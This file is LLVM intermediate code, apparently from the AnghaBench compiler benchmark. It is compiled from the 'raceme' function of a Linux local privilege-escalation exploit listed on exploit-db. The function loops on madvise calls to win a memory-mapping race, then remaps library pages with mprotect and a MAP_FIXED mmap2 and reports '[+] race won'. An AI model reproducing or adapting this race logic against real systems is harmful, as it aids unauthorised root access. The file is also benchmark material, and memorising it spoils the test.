; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_744.c_raceme.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_744.c_raceme.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@finish = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@go = common dso_local global i32 0, align 4
@tm2 = common dso_local global i32 0, align 4
@tm1 = common dso_local global i32 0, align 4
@delta = common dso_local global i32 0, align 4
@smp_max = common dso_local global i64 0, align 8
@delta_max = common dso_local global i64 0, align 8
@smp = common dso_local global i64 0, align 8
@lib_addr = common dso_local global i64 0, align 8
@PAGE_SIZE = common dso_local global i32 0, align 4
@MADV_NORMAL = common dso_local global i32 0, align 4
@val = common dso_local global i32 0, align 4
@LIB_SIZE = common dso_local global i32 0, align 4
@ENOMEM = common dso_local global i64 0, align 8
@map_addr = common dso_local global i32 0, align 4
@map_flags = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [9 x i8] c"mprotect\00", align 1
@PROT_NONE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"mmap2 race\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"\0A[+] race won maps=%d\00", align 1
@map_count = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @raceme(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 1, i32* @finish, align 4
  br label %3

3:                                                ; preds = %61, %51, %30, %1
  store i64 0, i64* @errno, align 8
  br label %4

4:                                                ; preds = %19, %3
  %5 = load i32, i32* @go, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %9, label %7

7:                                                ; preds = %4
  %8 = call i32 (...) @sys_sched_yield()
  br label %9

9:                                                ; preds = %7, %4
  %10 = call i32 @sys_gettimeofday(i32* @tm2, i32* null)
  %11 = call i32 @tmdiff(i32* @tm1, i32* @tm2)
  store i32 %11, i32* @delta, align 4
  %12 = load i64, i64* @smp_max, align 8
  %13 = icmp ne i64 %12, 0
  br i1 %13, label %20, label %14

14:                                               ; preds = %9
  %15 = load i32, i32* @delta, align 4
  %16 = load i64, i64* @delta_max, align 8
  %17 = trunc i64 %16 to i32
  %18 = icmp ult i32 %15, %17
  br i1 %18, label %19, label %20

19:                                               ; preds = %14
  br label %4

20:                                               ; preds = %14, %9
  %21 = load i64, i64* @smp_max, align 8
  store i64 %21, i64* @smp, align 8
  br label %22

22:                                               ; preds = %57, %20
  %23 = load i64, i64* @lib_addr, align 8
  %24 = inttoptr i64 %23 to i8*
  %25 = load i32, i32* @PAGE_SIZE, align 4
  %26 = load i32, i32* @MADV_NORMAL, align 4
  %27 = call i32 @sys_madvise(i8* %24, i32 %25, i32 %26)
  store i32 %27, i32* @val, align 4
  %28 = load i32, i32* @val, align 4
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %22
  br label %3

31:                                               ; preds = %22
  store i64 0, i64* @errno, align 8
  %32 = load i64, i64* @lib_addr, align 8
  %33 = load i32, i32* @PAGE_SIZE, align 4
  %34 = sext i32 %33 to i64
  %35 = add nsw i64 %32, %34
  %36 = inttoptr i64 %35 to i8*
  %37 = load i32, i32* @LIB_SIZE, align 4
  %38 = load i32, i32* @PAGE_SIZE, align 4
  %39 = sub nsw i32 %37, %38
  %40 = load i32, i32* @MADV_NORMAL, align 4
  %41 = call i32 @sys_madvise(i8* %36, i32 %39, i32 %40)
  store i32 %41, i32* @val, align 4
  %42 = load i32, i32* @val, align 4
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %51

44:                                               ; preds = %31
  %45 = load i32, i32* @val, align 4
  %46 = icmp slt i32 %45, 0
  br i1 %46, label %47, label %52

47:                                               ; preds = %44
  %48 = load i64, i64* @errno, align 8
  %49 = load i64, i64* @ENOMEM, align 8
  %50 = icmp ne i64 %48, %49
  br i1 %50, label %51, label %52

51:                                               ; preds = %47, %31
  br label %3

52:                                               ; preds = %47, %44
  %53 = load i64, i64* @smp, align 8
  %54 = add nsw i64 %53, -1
  store i64 %54, i64* @smp, align 8
  %55 = load i64, i64* @smp, align 8
  %56 = icmp sge i64 %55, 0
  br i1 %56, label %57, label %58

57:                                               ; preds = %52
  br label %22

58:                                               ; preds = %52
  %59 = load i32, i32* @go, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %62, label %61

61:                                               ; preds = %58
  br label %3

62:                                               ; preds = %58
  %63 = load i32, i32* @finish, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* @finish, align 4
  %65 = load i32, i32* @map_addr, align 4
  %66 = load i32, i32* @PAGE_SIZE, align 4
  %67 = load i32, i32* @map_flags, align 4
  %68 = call i32 @sys_mprotect(i32 %65, i32 %66, i32 %67)
  store i32 %68, i32* @val, align 4
  %69 = load i32, i32* @val, align 4
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %71, label %73

71:                                               ; preds = %62
  %72 = call i32 @fatal(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i32 0)
  br label %73

73:                                               ; preds = %71, %62
  %74 = load i64, i64* @lib_addr, align 8
  %75 = load i32, i32* @PAGE_SIZE, align 4
  %76 = sext i32 %75 to i64
  %77 = add nsw i64 %74, %76
  %78 = load i32, i32* @PAGE_SIZE, align 4
  %79 = mul nsw i32 %78, 3
  %80 = load i32, i32* @PROT_NONE, align 4
  %81 = load i32, i32* @MAP_PRIVATE, align 4
  %82 = load i32, i32* @MAP_ANONYMOUS, align 4
  %83 = or i32 %81, %82
  %84 = load i32, i32* @MAP_FIXED, align 4
  %85 = or i32 %83, %84
  %86 = call i32 @sys_mmap2(i64 %77, i32 %79, i32 %80, i32 %85, i32 0, i32 0)
  store i32 %86, i32* @val, align 4
  %87 = load i32, i32* @val, align 4
  %88 = icmp eq i32 -1, %87
  br i1 %88, label %89, label %91

89:                                               ; preds = %73
  %90 = call i32 @fatal(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i32 0)
  br label %91

91:                                               ; preds = %89, %73
  %92 = load i32, i32* @map_count, align 4
  %93 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i32 %92)
  %94 = load i32, i32* @stdout, align 4
  %95 = call i32 @fflush(i32 %94)
  %96 = call i32 @_exit(i32 0) #3
  unreachable
}

declare dso_local i32 @sys_sched_yield(...) #1

declare dso_local i32 @sys_gettimeofday(i32*, i32*) #1

declare dso_local i32 @tmdiff(i32*, i32*) #1

declare dso_local i32 @sys_madvise(i8*, i32, i32) #1

declare dso_local i32 @sys_mprotect(i32, i32, i32) #1

declare dso_local i32 @fatal(i8*, i32) #1

declare dso_local i32 @sys_mmap2(i64, i32, i32, i32, i32, i32) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @fflush(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
